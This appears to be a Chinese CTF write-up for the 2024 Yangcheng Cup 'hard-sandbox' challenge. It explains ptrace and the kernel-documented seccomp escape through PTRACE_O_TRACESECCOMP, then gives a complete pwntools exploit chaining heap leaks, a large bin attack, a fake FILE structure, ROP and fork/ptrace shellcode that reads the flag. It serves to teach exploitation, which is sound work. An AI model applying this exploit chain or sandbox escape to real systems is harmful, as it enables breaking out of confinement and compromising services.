前言
==

- 打2024羊城杯遇到一个hard-sandbox题目，禁用了open,openat,也不让用32系统调用(retfq也无法使用)，于是就卡住做不出来了，赛后一段时间想起来这个题在网上搜了一下看有的师傅说可以用ptrace绕过沙箱来拿到flag，于是有了这篇文章

ptrace学习
========

- [主要是参考了这篇文章](https://www.anquanke.com/post/id/231078#h2-1)，这篇文章ptrace讲的很细，但重点是在逆向如何绕过ptrace进行调试，而不是笔者的目的绕过沙箱。网上讲ptrace文章也不少，但是大多数是讲原理。
- 这里记录一下学习ptrace原理的一些重点

ptrace 可以让父进程控制子进程运行，ptrace主要跟踪的是进程运行时的状态，直到收到一个终止信号结束进程，这里的信号如果是我们给程序设置的断点，则进程被中止，并且通知其父进程，在进程中止的状态下，进程的内存空间可以被读写。当然父进程还可以使子进程继续执行，并选择是否忽略引起中止的信号，ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪

strace和gdb工具就是基于ptrace编写的!!!

ptrace函数的定义

```c
#include <sys/ptrace.h>       
long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
```

一共有四个参数：  
request: 表示要执行的操作类型。  
pid: 要操作的目标进程ID  
addr: 要监控的目标内存地址  
data: 保存读取出或者要写入的数据 详情请参看man手册 <https://man7.org/linux/man-pages/man2/ptrace.2.html>

ptrace函数的内核实现：  
ptrace的内核实现在kernel/ptrace.c文件中，直接看内核接口是SYSCALL\_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，代码如下：  
源码链接: <https://elixir.bootlin.com/linux/v5.6/source/kernel/ptrace.c>

```c
#ifndef arch_ptrace_attach
#define arch_ptrace_attach(child)   do { } while (0)
#endif

SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,
        unsigned long, data)
{
    struct task_struct *child;
    long ret;

    if (request == PTRACE_TRACEME) {
        ret = ptrace_traceme();
        if (!ret)
            arch_ptrace_attach(current);
        goto out;
    }

    child = find_get_task_by_vpid(pid);
    if (!child) {
        ret = -ESRCH;
        goto out;
    }

    if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) {
        ret = ptrace_attach(child, request, addr, data);
        /*
         * Some architectures need to do book-keeping after
         * a ptrace attach.
         */
        if (!ret)
            arch_ptrace_attach(child);
        goto out_put_task_struct;
    }

    ret = ptrace_check_attach(child, request == PTRACE_KILL ||
                  request == PTRACE_INTERRUPT);
    if (ret < 0)
        goto out_put_task_struct;

    ret = arch_ptrace(child, request, addr, data);
    if (ret || request != PTRACE_DETACH)
        ptrace_unfreeze_traced(child);

 out_put_task_struct:
    put_task_struct(child);
 out:
    return ret;
}
```

在使用ptrace之前需要在两个进程间建立追踪关系，其中tracee可以不做任何事，也可使用prctl和PTRACE\_TRACEME来进行设置，ptrace编程的主要部分是tracer，它可以通过附着的方式与tracee建立追踪关系，建立之后，可以控制tracee在特定的时候暂停并向tracer发送相应信号，而tracer则通过循环等待waitpid来处理tracee发来的信号

建立追踪关系  
在进行追踪前需要先建立追踪关系，相关request有如下4个：  
PTRACE\_TRACEME：tracee表明自己想要被追踪，这会自动与父进程建立追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。  
PTRACE\_ATTACH：tracer用来附着一个进程tracee，以建立追踪关系，并向其发送SIGSTOP信号使其暂停。  
PTRACE\_SEIZE：像PTRACE\_ATTACH附着进程，但它不会让tracee暂停，addr参数须为0，data参数指定一位ptrace选项。  
PTRACE\_DETACH：解除追踪关系，tracee将继续运行。

需要知道request几个参数：

```text
PTRACE_POKETEXT, PTRACE_POKEDATA:往内存地址中写入一个字节。内存地址由addr给出。

PTRACE_PEEKTEXT, PTRACE_PEEKDATA:从内存地址中读取一个字节，内存地址由addr给出

PTRACE_ATTACH:跟踪指定pid 进程

PTRACE_GETREGS:读取所有寄存器的值

PTRACE_CONT:继续执行示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。

PTRACE_SETREGS:设置寄存器

PTRACE_DETACH:结束跟踪
```

再次解题
====

- 上述学习完是明白了ptrace的工作原理，但是好像和sandbox没太多关系，直接看到如下内容,[内容链接](https://www.kernel.org/doc/html/latest/translations/zh_CN/userspace-api/seccomp_filter.html)
- **在追踪器被通知后，seccomp检查不会再次运行。（这意味着基于seccomp的沙箱必须禁止 ptrace的使用，甚至其他沙箱进程也不行，除非非常小心；ptrace可以通过这个机制来逃逸。）** 这里的意思就是如果第一次触发了seccomp,那么第二次就不会再次触发seccomp,那么之后的沙盒等于没用了，官方文件也是说明了这个ptrace对seccomp的逃逸

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d799d8aeb9658d56325e4091e3522430c66df9f2.png)

- 可以看到题目的沙盒确实不是直接kill，而是返回trace。这样就有了利用思路，调用ptrace(PTRACE\_SETOPTIONS, pid, 0, PTRACE\_0\_TRACESECCOMP)然后让子进程拿到flag即可

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e5b6a4c7e4468ecb4885aff45ebe610c7eb183b0.png)

- exp

```python
from pwn import *
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/pwn")
# p=remote('139.155.126.78',31700)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc
gdb_script='''
'''
def dbg():
    gdb.attach(p,gdb_script)  
    pause()

# dbg()
sla = lambda data, content: p.sendlineafter(data, content)
sa = lambda data, content: p.sendafter(data, content)
sl = lambda data: p.sendline(data)

# ---------------------------------------------------------
def add(index, size):
    sla('>', '1')
    sla('Index: ', str(index))
    sla(': ', str(size))

def edit(index, content):
    sla('>', '3')
    sla('Index: ', str(index))
    sa(': ', content)

def delete(index):
    sla('>', '2')
    sla('Index: ', str(index))

def show(index):
    sla('>', '4')
    sla(': ', str(index))

#--------------------------泄露libcbase------------------------------
add(0, 0x520)
add(1, 0x508)
delete(0)
show(0)
libcbase =u64(p.recv(6).ljust(8, b'\x00'))- 0x1f6cc0

#-----------------------------泄露heapbase----------------------------
add(2, 0x508)
add(3, 0x518)
add(4, 0x528)
delete(2)
delete(3)
show(3)

heapbase =u64(p.recv(6).ljust(8, b'\x00'))- 0x290
add(2, 0x508)
add(3, 0x518)

print(libcbase)
print(hex(heapbase))

#-------------------------------large bin attack---------------------------------
add(5, 0x558)
add(6, 0x558)
add(7, 0x548)
add(8, 0x548)

delete(5)
add(9, 0x598)
delete(7)
io_list_all = libcbase + libc.sym['_IO_list_all']
wfile = libcbase + libc.sym['_IO_wfile_jumps']
lock = 0x3ed8b0 + libcbase
pop_rdi = libcbase + next(libc.search(asm('pop rdi;ret;')))
pop_rsi = libcbase + next(libc.search(asm('pop rsi;ret;')))
rsi_r15 = libcbase + 0x0000000000023b63
pop_rax = libcbase + 0x3fa43
pop_rdx = libcbase + 0x166262
ret = libcbase + 0x233d1

leave_ret = libcbase + next(libc.search(asm('leave;ret;')))
read_addr = libc.symbols['read'] + libcbase
magic_gadget = libcbase + 0x163090 + 0x1a
syscall = read_addr + 15

fake_io_addr = heapbase + 0x16E0
orw_addr = heapbase + 0x2740
orw = b'./flag\x00\x00'
orw += p64(rsi_r15) + p64(0) + p64(fake_io_addr - 0x10 + 0x40)
orw += p64(pop_rsi) + p64(0x2000)
orw += p64(pop_rdi) + p64(heapbase)
orw += p64(pop_rdx) + p64(7)
orw += p64(pop_rax) + p64(10)
orw += p64(syscall)
orw += p64(ret) + p64(heapbase + 0x2a0)
mprotect = libcbase + libc.sym['mprotect']

PTRACE_ATTACH = 0x10
PTRACE_SETOPTIONS = 0x4200
PTRACE_CONT = 7
PTRACE_DETACH = 0x11
PTRACE_O_TRACESECCOMP = 0x80

shellcode = shellcraft.fork()
shellcode += '''
        test eax,eax
        js exit
        /*把child_pid的值存到r15寄存器*/
        mov r15,rax

        cmp rax,0 
        je child_process

    parent_process:
       /*PTRACE_ATTACH  ptrace(request=0x10, v00='r15', v1=0, v2=0) */
        xor r10d, r10d /* 0 */
        push 0x10
        pop rdi
        xor edx, edx /* 0 */
        mov rsi, r15
        /* call ptrace() */
        push 101 /* 0x65 */
        pop rax
        syscall

        /* PTRACE_SETOPTIONS  PTRACE_O_TRACESECCOMP  ptrace(request=0x4200, v0='r15', v1=0, v2=0x80) */
        xor r10d, r10d
        mov r10b, 0x80
        mov edi, 0x1010101 /* 16896 == 0x4200 */
        xor edi, 0x1014301
        xor edx, edx /* 0 */
        mov rsi, r15
        /* call ptrace() */
        push 101 /* 0x65 */
        pop rax
        syscall

    monitor_child:
        /* wait4(pid=0, stat_loc=0, options=0, usage=0) */
        xor r10d, r10d /* 0 */
        xor edi, edi /* 0 */
        xor edx, edx /* 0 */
        xor esi, esi /* 0 */
        /* call wait4() */
        push 61 /* 0x3d */
        pop rax
        syscall

        /*PTRACE_CONT ptrace(request=7, v0='r15', v1=0, v2=0) */
        xor r10d, r10d /* 0 */
        push 7
        pop rdi
        xor edx, edx /* 0 */
        mov rsi, r15
        /* call ptrace() */
        push 101 /* 0x65 */
        pop rax
        syscall

        jmp monitor_child

    child_process:

        /* open(file='./flag', oflag=0, mode=0) */
        /* push b'./flag\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x67616c662f2e
        xor [rsp], rax
        mov rdi, rsp
        xor edx, edx /* 0 */
        xor esi, esi /* 0 */
        /* call open() */
        push 2 /* 2 */
        pop rax
        syscall

        /* sendfile(out_fd=1, in_fd='rax', offset=0, count=0x50) */
        push 0x50
        pop r10
        push 1
        pop rdi
        xor edx, edx /* 0 */
        mov rsi, rax
        /* call sendfile() */
        push 40 /* 0x28 */
        pop rax
        syscall

        /*没有成功执行再跳转*/
        cmp rax,0
        jle child_process

    exit:
        /* Exit the process */
        mov rax, 60             /* syscall number for exit */
        xor rdi, rdi            /* status 0 */
        syscall

'''

edit(0, asm(shellcode))
edit(8, orw)

payload = p64(0) + p64(leave_ret) + p64(0) + p64(io_list_all - 0x20)
payload += p64(0) * 2 + p64(0) + p64(orw_addr)
payload += p64(0) * 4
payload += p64(0) * 3 + p64(lock)
payload += p64(0) * 2 + p64(fake_io_addr + 0xe0 + 0x40) + p64(0)
payload += p64(0) * 4
payload += p64(0) + p64(wfile)
payload += p64(0) * 0x1c + p64(fake_io_addr + 0xe0 + 0xe8 + 0x40)
payload += p64(0) * 0xd + p64(magic_gadget)
edit(5, payload)

add(10, 0x640)
add(11, 0x540)

p.sendline('5')

p.interactive()
```

- 成功拿到flag

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8f3b2cd7784176bcbe459fecb6dab033a6d0cc54.png)

后记
==

- 在编写exp的时候要注意，由于子进程是父进程fork出来的，那么我们并无法得知两者执行速度。但在笔者的理解中，只有父进程执行完ptrace(PTRACE\_SETOPTIONS, pid, 0, PTRACE\_0\_TRACESECCOMP)后，才能真正的绕过沙盒。在此之后子进程才能绕过沙盒随意执行任何系统调用。
- 那么就要在sendfile系统调用后加上下面这段，也就是让子进程循环执行open和sendfile这两个系统调用，保证父进程执行完ptrace(PTRACE\_SETOPTIONS, pid, 0, PTRACE\_0\_TRACESECCOMP)，在此之后子进程就可以顺利执行open和sendfile，那么rax的值也就不会小于等于0，拿到flag程序也就退出了

```asm
/*没有成功执行再跳转*/
    cmp rax,0
    jle child_process
```

- 本地似乎还可以用io\_using打通(远程要看内核版本了)，但是笔者还没有学习io\_using，所以还没有实践 todo